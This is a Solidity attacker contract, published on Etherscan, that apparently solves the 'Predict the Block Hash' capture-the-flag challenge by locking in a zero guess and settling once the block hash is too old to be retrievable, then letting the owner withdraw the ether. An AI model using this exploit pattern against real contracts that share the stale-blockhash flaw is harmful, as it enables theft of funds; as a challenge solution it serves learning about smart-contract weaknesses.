/**
 *Submitted for verification at Etherscan.io on 2022-04-18
*/

pragma solidity ^0.4.26;

interface PredictTheBlockHashChallenge {

    function isComplete() public view returns (bool);
    function lockInGuess(bytes32 hash) public payable;
    function settle() public;
}

contract AttackTheBlockHashChallenge {
    
    function () external payable {}

    address _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }    

    address victimAddr = 0;
    function AttackTheBlockHashChallenge(address _addr) public payable {
        _owner = msg.sender;
        victimAddr = _addr;        
    }

    function lockInG (uint8 n) public {
        PredictTheBlockHashChallenge victimContract = PredictTheBlockHashChallenge(victimAddr);
        victimContract.lockInGuess.value(1 ether)(bytes32(n));
    }

    function win() public {
        PredictTheBlockHashChallenge victimContract = PredictTheBlockHashChallenge(victimAddr);
        victimContract.settle();
    }

    function returnBlockNumberHash(uint256 blockNumber) public view returns (bytes32){
        return block.blockhash(blockNumber);
    }   

    function sendEtherToContract() public payable returns (bool) {
        uint balanceNow;
        require(msg.value > 0 );
        bool success = address(this).balance > balanceNow;
        return success;
    }

    function sendBalanceBack() public onlyOwner returns(bool){
        msg.sender.transfer(address(this).balance);
        if (address(this).balance == 0) {
            return true;
        }
        else
        {
            return false;
        }
    }


}